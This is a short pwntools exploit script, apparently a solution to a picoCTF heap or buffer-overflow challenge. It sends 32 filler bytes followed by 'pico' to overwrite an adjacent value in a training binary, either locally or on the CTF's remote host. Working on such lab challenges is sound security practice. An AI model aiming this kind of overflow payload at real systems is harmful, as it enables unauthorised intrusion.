#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("tethys.picoctf.net", 64002)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    io.sendlineafter(b'choice:', b'2')
    io.sendlineafter(b'buffer:', b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico')
    io.sendlineafter(b'choice:', b'4')

    io.interactive()

if __name__ == "__main__":
    main()
